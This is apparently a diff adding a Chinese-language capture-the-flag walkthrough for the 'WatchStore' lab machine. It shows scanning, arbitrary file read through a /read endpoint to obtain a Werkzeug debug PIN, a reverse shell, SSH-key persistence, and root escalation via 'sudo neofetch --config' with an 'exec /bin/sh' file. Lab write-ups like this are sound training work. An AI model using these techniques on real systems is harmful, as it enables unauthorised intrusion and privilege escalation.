@@ -1952,3 +1952,199 @@ laflagdelbunkerderootmola??????
   - exec sh：用sh进程替换当前sed进程
   - 1>&0：将标准输出重定向到标准输入，确保shell的I/O能正常工作
 
+## WatchStore
+> **提示:** 靶机跳转传送门
+[WatchStore](https://labs.thehackerslabs.com/machines/111)
+
+<img src="/assets/img/thehackerslabs-notes/WatchStore.png" alt="WatchStore" style="zoom:50%;" />
+
+### 信息搜集
+
+```bash
+❯ nmap -p- --min-rate 5000 10.161.168.195
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-11-11 13:14 CST
+Nmap scan report for 10.161.168.195
+Host is up (0.00066s latency).
+Not shown: 65533 closed tcp ports (conn-refused)
+PORT     STATE SERVICE
+22/tcp   open  ssh
+8080/tcp open  http-proxy
+
+Nmap done: 1 IP address (1 host up) scanned in 8.06 seconds
+```
+
+追踪下web服务
+
+发现需要更改host
+
+```bash
+❯ curl http://10.161.168.195:8080/
+<!doctype html>
+<html lang=en>
+<title>Redirecting...</title>
+<h1>Redirecting...</h1>
+<p>You should be redirected automatically to the target URL: <a href="http://watchstore.thl:8080/">http://watchstore.thl:8080/</a>. If not, click the link.
+```
+
+Windows下需要在C:\Windows\System32\drivers\etc\hosts中编辑
+
+<img src="/assets/img/thehackerslabs-notes/image-20251111131801461.png" alt="image-20251111131801461" style="zoom:50%;" />
+
+Linux的话，需要在/etc/hosts中编辑
+
+不过编辑的内容都一样，将这串追加到末尾
+
+```bash
+10.161.168.195 watchstore.thl
+```
+
+### get shell
+
+扫描路径，拿到了几个关键路由
+
+```bash
+❯ gobuster dir -u http://watchstore.thl:8080/ -w /snap/seclists/1214/Discovery/Web-Content/common.txt -t 100
+===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://watchstore.thl:8080/
+[+] Method:                  GET
+[+] Threads:                 100
+[+] Wordlist:                /snap/seclists/1214/Discovery/Web-Content/common.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.6
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/console              (Status: 200) [Size: 1563]
+/products             (Status: 200) [Size: 772]
+/read                 (Status: 500) [Size: 13133]
+Progress: 4750 / 4750 (100.00%)
+===============================================================
+Finished
+===============================================================
+```
+
+主要是这里的Werkzeug开启了debug服务，所以能直接在浏览器拿到console，但是这里有个问题，我不清楚pin是什么，然后看到了read路由，发现这里想read_file缺少id参数
+
+<img src="/assets/img/thehackerslabs-notes/image-20251111154141019.png" alt="image-20251111154141019" style="zoom:50%;" />
+
+直接访问，发现确实是任意文件读取
+
+```bash
+❯ curl http://watchstore.thl:8080/read\?id\=/etc/passwd
+<pre>root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
+_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
+messagebus:x:100:107::/nonexistent:/usr/sbin/nologin
+sshd:x:101:65534::/run/sshd:/usr/sbin/nologin
+relox:x:1001:1001::/home/relox:/bin/bash
+</pre>%   
+```
+
+然后直接访问app.py，拿到了固定的pin
+
+<img src="/assets/img/thehackerslabs-notes/image-20251111154315200.png" alt="image-20251111154315200" style="zoom:50%;" />
+
+然后进行python反弹shell
+
+<img src="/assets/img/thehackerslabs-notes/image-20251111154647777.png" alt="image-20251111154647777" style="zoom:50%;" />
+
+我这里顺便进行了维持shell，可以看我上面的靶机题解过程，有写详细部分
+
+不过这个题嘛，既然有了用户shell，那就配置个ssh连接好了
+
+只需要在本地shell中跑`ssh-keygen -t rsa -b 4096 -f watchstore_key`，然后将pub公钥复制，下面操作是在靶机上进行的
+
+```bash
+mkdir -p ~/.ssh
+chmod 700 ~/.ssh
+echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQDQVDY9KJPwXxC+vPyHvTlaVXU/SdHt1cF2IiCKihu2Xdtb767r+ahAnVJuFdMlimAG904OsPS/MqPRWp2AmK+sIQ3GeL/Pd3ftpB9/QCjBjtqCh0R4fbQJA/yvOCBux+Z5Y4m+YnkinENSFwGdAkn/a7e5u0Kjius9NGizPDdHDpJyqlq/IzSFpM6xJVOnWSZBDsMdhS4bbmpVMces4xGuYumo5kYcmSerwP/OATwc9I3rkENnRM2FBWjw2kGRPDQO07qzwsZmRqDRxtOZOJiDvmJFE/MICw15g7vBWM04havQpJqC4tB4Cyw9KyvJb7hT25tgmGfdVPm34i+tud/FQsZI3H1e/P9yQJc4YFzGvQJfl3Lo11aRbJn+6JVl2XEpurn/QcY0vjjbppyI+VBkEYkCReZ2MEiJMuLg+tloGgBwMQ5cubtkj4/l9KroQDlqqlgYscKgW4sy5ABxNGdsbvK757T/cxM5m79Rt1zV43YRSSJ7GLVDZKXiy+AedSbw2j1AC/U85W4nDCGSkSZUQwAcNVF7R6Be2xHS96l59glHJhuWVENFjYnsGer6rWddWeY2QB9lFDzbS8ojz4IPLwqixlLFOlb8nJkm7hF9mGtog5MaTIFM7YxADx8n8TFLwvboxiQr2DA7tfot74ZrRGwUFe2auxS8mgEI????????????? 24062@yolo" >> ~/.ssh/authorized_keys
+chmod 600 ~/.ssh/authorized_keys
+
+```
+
+<img src="/assets/img/thehackerslabs-notes/image-20251111162018285.png" alt="image-20251111162018285" style="zoom:50%;" />
+
+用windterm连接的好处很多，比如说可以直接传文件什么的
+
+```bash
+relox@thehackerslabs-watchstore:~/watchstore$ cd
+relox@thehackerslabs-watchstore:~$ ls -la
+total 36
+drwxr-xr-x 4 relox relox 4096 nov 11 06:37 .
+drwxr-xr-x 3 root  root  4096 may 26 11:44 ..
+lrwxrwxrwx 1 root  root     9 jun 16 10:59 .bash_history -> /dev/null
+-rw-r--r-- 1 relox relox  220 abr 19  2025 .bash_logout
+-rw-r--r-- 1 relox relox 3526 abr 19  2025 .bashrc
+drwxr-xr-x 3 relox relox 4096 jun  6 10:04 .local
+-rw-r--r-- 1 relox relox  807 abr 19  2025 .profile
+-rw-r--r-- 1 relox relox   66 may 26 12:04 .selected_editor
+-rw-r--r-- 1 relox relox   33 jun 16 11:10 user.txt
+drwxr-xr-x 4 relox relox 4096 jun 16 10:57 watchstore
+relox@thehackerslabs-watchstore:~$ cat user.txt       
+43209bbbe006e21f88cf1a53b9??????
+relox@thehackerslabs-watchstore:~$ sudo -l
+sudo: unable to resolve host thehackerslabs-watchstore: Nombre o servicio desconocido
+Matching Defaults entries for relox on thehackerslabs-watchstore:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
+    env_keep+=XDG_CONFIG_HOME, use_pty
+
+User relox may run the following commands on thehackerslabs-watchstore:
+    (root) NOPASSWD: /usr/bin/neofetch
+```
+
+拿到了user flag，提权的时候，观察到这里可以无密码执行sudo命令neofetch
+
+我们先本地下载安装一个`neofetch`，仔细观察下它的功能列表
+
+<img src="/assets/img/thehackerslabs-notes/image-20251111162215317.png" alt="image-20251111162215317" style="zoom:50%;" />
+
+<img src="/assets/img/thehackerslabs-notes/image-20251111155729336.png" alt="image-20251111155729336" style="zoom:50%;" />
+
+```bash
+neofetch --help
+我感觉最有可能提权成功的一条
+--config /path/to/config    Specify a path to a custom config file
+```
+
+简单来说，我可以构造个恶意的配置文件，让neofetch直接给我shell
+
+```bash
+relox@thehackerslabs-watchstore:~$ echo 'exec /bin/sh' > hacker
+relox@thehackerslabs-watchstore:~$ ls
+hacker  user.txt  watchstore
+relox@thehackerslabs-watchstore:~$ neofetch --config hacker
+$ id
+uid=1001(relox) gid=1001(relox) groups=1001(relox),109(docker)
+$ exit
+relox@thehackerslabs-watchstore:~$ sudo neofetch --config hacker
+sudo: unable to resolve host thehackerslabs-watchstore: Nombre o servicio desconocido
+# id
+uid=0(root) gid=0(root) groups=0(root)
+# cd  
+# ls
+root.txt
+# cat root.txt
+c3ab266a11de0294257eaef357??????
+```
+
